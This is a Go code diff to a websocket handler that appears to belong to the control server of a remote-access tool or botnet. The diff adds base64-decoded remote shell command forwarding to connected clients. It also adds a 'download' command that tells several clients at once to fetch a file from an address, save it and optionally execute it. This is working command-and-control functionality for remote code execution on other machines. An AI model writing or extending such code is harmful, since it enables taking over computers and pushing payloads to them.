@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
 	"github.com/gorilla/websocket"
 	"github.com/labstack/echo"
@@ -90,26 +91,60 @@ func WsHandle(c echo.Context) error {
 		case "shell":
 			var code string
 			id := m[1]
-			fmt.Println("id:",id)
+			fmt.Println("id:",id,len(m))
 			if len(m) == 2 {
 				code = ""
+
 			} else {
-				code = string(m[2])
+				decodeBytes, err := base64.StdEncoding.DecodeString(m[2])
+				if err != nil {
+					// 解码失败了，不管他.jpg
+					continue
+				}
+				code = string(decodeBytes)
 			}
 			for i := range serverMap {
 				if serverMap[i].uuid == string(id) {
 					fmt.Println("find it.")
 					if serverMap[i].status == SERVER_SHELL {
-						fmt.Println("input",m[2])
-						serverMap[i].shellInChan <- string(m[2])+"\n"
+						fmt.Println("input",code)
+						if code != ""{
+							serverMap[i].shellInChan <- code+"\n"
+						}
+
 					} else {
 						Handle(i, SERVER_SHELL)
 						if code != "" {
-							serverMap[i].shellInChan <- string(m[2])+"\n"
+							serverMap[i].shellInChan <- code+"\n"
 						}
 					}
 				}
 			}
+		case "download":
+			raw := m[1]
+			var run uint8
+			iid := strings.Split(raw,",")
+			if len(m) != 5{
+				continue
+			}
+
+			address := m[2]
+			save_path := m[3]
+			execute := m[4]
+			if execute == "yes"{
+				run = 1
+			}else{
+				run = 0
+			}
+			for _,id := range iid{
+				for i := range serverMap {
+					if serverMap[i].uuid == string(id) {
+						fmt.Println("find it.")
+						FunctionDownload(i,address,save_path,run)
+					}
+				}
+			}
+			continue
 		}
 
 	}
